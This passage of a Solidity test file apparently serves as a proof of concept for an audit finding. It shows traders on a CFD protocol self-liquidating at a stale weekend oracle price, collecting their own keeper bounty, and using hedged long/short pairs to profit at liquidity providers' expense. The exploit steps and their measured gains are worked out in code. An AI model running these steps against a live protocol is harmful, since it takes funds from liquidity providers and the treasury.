        // (k) the same liquidation by a third-party keeper: c - k is the keeper share credited to the trader itself.
        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        _liquidate(KEEPER, ALICE);
        uint256 thirdPartyBounty = clearinghouse.balanceAssets(KEEPER) - keeperBefore;
        Outcome memory k = _outcome(ALICE);
        vm.revertToState(snap);

        // (a) hold through the weekend; Monday reopens 50 bps against the LONG; close live.
        uint256 live = _nextLiveOpen();
        uint256 snapLive = vm.snapshotState();
        vm.warp(live + 30 minutes);
        _mark(0.959775e8); // 0.955 * 1.005
        _voluntaryClose(ALICE, CfdTypes.Side.LONG, SIZE);
        _withdrawAllFree(ALICE);
        Outcome memory a = _outcome(ALICE);
        vm.revertToState(snapLive);

        // (f) hold through the weekend; Monday reopens 50 bps in favour of the LONG; close live.
        vm.warp(live + 30 minutes);
        _mark(0.950225e8); // 0.955 * 0.995
        _voluntaryClose(ALICE, CfdTypes.Side.LONG, SIZE);
        _withdrawAllFree(ALICE);
        Outcome memory f = _outcome(ALICE);

        console2.log("--- trader value (USDG atoms) ---");
        console2.log("(a) hold, close Monday after a 50 bps adverse gap", a.traderValue);
        console2.log("(f) hold, close Monday after a 50 bps favourable gap", f.traderValue);
        console2.log("(b) designed frozen voluntary close Saturday", b.traderValue);
        console2.log("(c) self-liquidation Saturday", c.traderValue);
        console2.log("(k) third-party liquidation Saturday", k.traderValue);
        console2.log("keeper share credited to the liquidated account itself (c - k)", c.traderValue - k.traderValue);
        console2.log("bounty paid to a third-party keeper", thirdPartyBounty);

        int256 gainVsB = int256(c.traderValue) - int256(b.traderValue);
        int256 lpVsB = int256(b.poolAssets) - int256(c.poolAssets);
        int256 gainVsA = int256(c.traderValue) - int256(a.traderValue);
        int256 lpVsA = int256(a.poolAssets) - int256(c.poolAssets);
        console2.log("trader gain (c) vs (b) (atoms)", gainVsB);
        console2.log("  bps x100 of notional", _bps(gainVsB, notional));
        console2.log("LP pool shortfall (c) vs (b) (atoms)", lpVsB);
        console2.log("  bps x100 of notional", _bps(lpVsB, notional));
        console2.log("treasury fee lost (b) - (c) (atoms)", int256(b.treasury) - int256(c.treasury));
        console2.log("trader gain (c) vs (a) (atoms)", gainVsA);
        console2.log("  bps x100 of notional", _bps(gainVsA, notional));
        console2.log("LP pool shortfall (c) vs (a) (atoms)", lpVsA);
        console2.log("  bps x100 of notional", _bps(lpVsA, notional));

        assertGt(gainVsB, 0, "self-liquidation beats the designed frozen exit");
        assertGt(lpVsB, 0, "LPs receive less than under the designed exit");
        assertGt(b.treasury, c.treasury, "treasury loses the execution fee");
        assertEq(c.traderValue - k.traderValue, thirdPartyBounty, "trader collects its own keeper share");
        assertGt(gainVsA, 0, "after an adverse weekend, self-liquidation beats holding");
        assertGt(lpVsA, 0, "LPs pay for the stale-mark exit");
        assertGt(f.traderValue, c.traderValue, "after a favourable weekend the trader simply holds: a free option");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Lever 2: pledge-first carry crosses the 3% FAD margin during the freeze
    // ------------------------------------------------------------------------------------------------------------

    /// Opens `acct` before the Friday FAD window so that its pledge enters the freeze `buffer` above the 3% FAD margin.
    function _openNearFadMargin(
        address acct,
        CfdTypes.Side side,
        uint256 size,
        uint256 buffer
    ) internal {
        _fundTrader(acct, 30_000e6);
        uint256 s = vm.snapshotState();
        _open(acct, side, size, 20_000e6); // learn the open cost (fee + VPI + liquidation reserve)
        uint256 cost = 20_000e6 - _pledge(acct);
        vm.revertToState(s);
        _open(acct, side, size, cost + _notional(size) * 300 / 10_000 + buffer);
    }

    function _lever2Setup() internal {
        uint256 fad = _nextStart(false);
        vm.warp(fad - 2 hours);
        _mark(1e8);
        _openNearFadMargin(CAROL, CfdTypes.Side.LONG, SIZE, 28e6);
        console2.log("lever 2 pledge after open (atoms)", _pledge(CAROL));
        vm.warp(_nextStart(true));
        assertTrue(engine.isOracleFrozen(), "frozen");
        assertFalse(_liq(CAROL), "healthy entering the freeze");
    }

    function test_Lever2_CarryCrossesFadMargin_SelfAndThirdPartyLiquidation() public {
        _lever2Setup();
        uint256 h = _hoursUntilLiquidatable(CAROL);
        console2.log("hours into the freeze until liquidatable (no top-up)", h);
        assertLt(h, 48, "crossing happens during the freeze");
        assertTrue(engine.isOracleFrozen(), "still frozen at the crossing");
        uint256 freeAtCrossing = clearinghouse.getAccountAssetBuckets(CAROL).freeSettlementAssets;
        console2.log("free settlement at the crossing (atoms)", freeAtCrossing);
        console2.log("unsettled carry at the crossing (atoms)", engine.unsettledCarryAssets(CAROL));
        assertGt(freeAtCrossing, 0, "free settlement still positive");
        assertEq(engine.unsettledCarryAssets(CAROL), 0, "no carry arrears: eligibility is plain FAD price health");
        uint256 notional = _notional(SIZE);
        uint256 snap = vm.snapshotState();

        _voluntaryClose(CAROL, CfdTypes.Side.LONG, SIZE);
        Outcome memory b = _outcome(CAROL);
        vm.revertToState(snap);

        _liquidate(CAROL, CAROL);
        Outcome memory c = _outcome(CAROL);
        vm.revertToState(snap);

        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        _liquidate(KEEPER, CAROL);
        Outcome memory k = _outcome(CAROL);
        console2.log("third-party keeper bounty (atoms)", clearinghouse.balanceAssets(KEEPER) - keeperBefore);

        console2.log("--- lever 2 trader value (USDG atoms) ---");
        console2.log("(b) frozen voluntary close", b.traderValue);
        console2.log("(c) self-liquidation", c.traderValue);
        console2.log("(k) third-party liquidation", k.traderValue);
        int256 gainC = int256(c.traderValue) - int256(b.traderValue);
        int256 gainK = int256(k.traderValue) - int256(b.traderValue);
        int256 lpC = int256(b.poolAssets) - int256(c.poolAssets);
        int256 lpK = int256(b.poolAssets) - int256(k.poolAssets);
        console2.log("trader gain (c) vs (b)", gainC);
        console2.log("  bps x100 of notional", _bps(gainC, notional));
        console2.log("trader gain (k) vs (b)", gainK);
        console2.log("LP pool shortfall (c) vs (b)", lpC);
        console2.log("  bps x100 of notional", _bps(lpC, notional));
        console2.log("LP pool shortfall (k) vs (b)", lpK);
        assertGt(c.traderValue, b.traderValue, "self-liquidation beats the frozen close");
        assertGt(k.traderValue, b.traderValue, "even a third-party liquidation beats the frozen close");
        assertGt(lpK, 0, "LPs lose with a third-party keeper too");
    }

    function test_Lever2_TopUpPostponesCrossing() public {
        _lever2Setup();
        uint256 snap = vm.snapshotState();
        uint256 h = _hoursUntilLiquidatable(CAROL);
        vm.revertToState(snap);
        vm.warp(_now() + (h - 1) * 1 hours);
        vm.prank(CAROL);
        engine.addMargin(CAROL, 50e6); // not gated by the freeze
        vm.warp(_now() + 1 hours);
        console2.log("crossing hour without top-up", h);
        assertFalse(_liq(CAROL), "a 50 USDG top-up postpones the crossing");
        uint256 h2 = _hoursUntilLiquidatable(CAROL);
        console2.log("additional hours healthy after the top-up (capped at 48)", h2);
        assertGt(h2, 0, "still healthy after the original crossing hour");
    }

    /// One owner holds a delta-neutral pair (LONG + SHORT) that enters the freeze just above the FAD margin. Weekend
    /// information shows the market will reopen 50 bps higher (bad for the LONG). The owner tops up only the SHORT and
    /// lets carry push the LONG over the FAD margin; the LONG is liquidated at the stale Friday mark and the SHORT is
    /// closed live on Monday at the gap price. Compared with (Y) holding both legs and with (Z) the designed frozen
    /// close of the losing leg.
    function test_Lever2_HedgedPairBecomesStalePriceChooser() public {
        uint256 fad = _nextStart(false);
        vm.warp(fad - 2 hours);
        _mark(1e8);
        _openNearFadMargin(HEDGE_LONG, CfdTypes.Side.LONG, HEDGE_SIZE, 10e6);
        _openNearFadMargin(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_SIZE, 10e6);
        vm.warp(_nextStart(true));
        assertTrue(engine.isOracleFrozen(), "frozen");
        assertFalse(_liq(HEDGE_LONG) || _liq(HEDGE_SHORT), "both legs healthy entering the freeze");
        uint256 live = _nextLiveOpen();

        uint256 snap = vm.snapshotState();
        uint256 h = _hoursUntilLiquidatable(HEDGE_LONG);
        vm.revertToState(snap);
        console2.log("hours into the freeze until the LONG leg is liquidatable", h);
        assertLt(h, 48, "LONG crosses during the freeze");
        uint256 notional = _notional(HEDGE_SIZE);

        // (Y) baseline: keep the hedge, top up both legs, close both live on Monday after the +50 bps gap.
        vm.warp(_now() + 1 hours);
        vm.prank(HEDGE_LONG);
        engine.addMargin(HEDGE_LONG, 200e6);
        vm.prank(HEDGE_SHORT);
        engine.addMargin(HEDGE_SHORT, 200e6);
        vm.warp(live + 30 minutes);
        _mark(1.005e8);
        _voluntaryClose(HEDGE_LONG, CfdTypes.Side.LONG, HEDGE_SIZE);
        _voluntaryClose(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_SIZE);
        uint256 yValue = _value(HEDGE_LONG) + _value(HEDGE_SHORT);
        uint256 yPool = pool.totalAssets();
        vm.revertToState(snap);

        // (Z) designed exit: frozen voluntary close of the losing LONG leg, SHORT topped up and closed Monday.
        vm.warp(_now() + 1 hours);
        vm.prank(HEDGE_SHORT);
        engine.addMargin(HEDGE_SHORT, 200e6);
        _voluntaryClose(HEDGE_LONG, CfdTypes.Side.LONG, HEDGE_SIZE);
        vm.warp(live + 30 minutes);
        _mark(1.005e8);
        _voluntaryClose(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_SIZE);
        uint256 zValue = _value(HEDGE_LONG) + _value(HEDGE_SHORT);
        uint256 zPool = pool.totalAssets();
        vm.revertToState(snap);

        // (X) attack: top up only the SHORT, let carry push the LONG over the FAD margin, self-liquidate it at the
        //     stale Friday mark, close the SHORT live on Monday.
        vm.warp(_now() + 1 hours);
        vm.prank(HEDGE_SHORT);
        engine.addMargin(HEDGE_SHORT, 200e6);
        vm.warp(_now() + h * 1 hours);
        assertTrue(engine.isOracleFrozen(), "still frozen");
        assertTrue(_liq(HEDGE_LONG), "LONG leg liquidatable from carry alone");
        assertFalse(_liq(HEDGE_SHORT), "SHORT leg kept healthy by its top-up");
        _liquidate(HEDGE_LONG, HEDGE_LONG);
        vm.warp(live + 30 minutes);
        _mark(1.005e8);
        _voluntaryClose(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_SIZE);
        uint256 xValue = _value(HEDGE_LONG) + _value(HEDGE_SHORT);
        uint256 xPool = pool.totalAssets();

        console2.log("--- hedged pair, owner value across both accounts (USDG atoms) ---");
        console2.log("(Y) hold the hedge, close both Monday", yValue);
        console2.log("(Z) designed frozen close of the losing leg", zValue);
        console2.log("(X) carry-crossing self-liquidation of the losing leg", xValue);
        int256 xy = int256(xValue) - int256(yValue);
        int256 zy = int256(zValue) - int256(yValue);
        int256 lpXY = int256(yPool) - int256(xPool);
        int256 lpXZ = int256(zPool) - int256(xPool);
        console2.log("owner gain (X) vs (Y) (atoms)", xy);
        console2.log("  bps x100 of one leg's notional", _bps(xy, notional));
        console2.log("owner gain (Z) vs (Y) (atoms)", zy);
        console2.log("LP pool shortfall (X) vs (Y) (atoms)", lpXY);
        console2.log("  bps x100 of one leg's notional", _bps(lpXY, notional));
        console2.log("LP pool shortfall (X) vs (Z) (atoms)", lpXZ);
        assertGt(xy, 0, "stale-mark liquidation turns a hedge into a profitable chooser");
        assertGt(xValue, zValue, "self-liquidation beats the designed frozen exit");
        assertGt(lpXY, 0, "LPs pay for the chooser");
    }

}
```

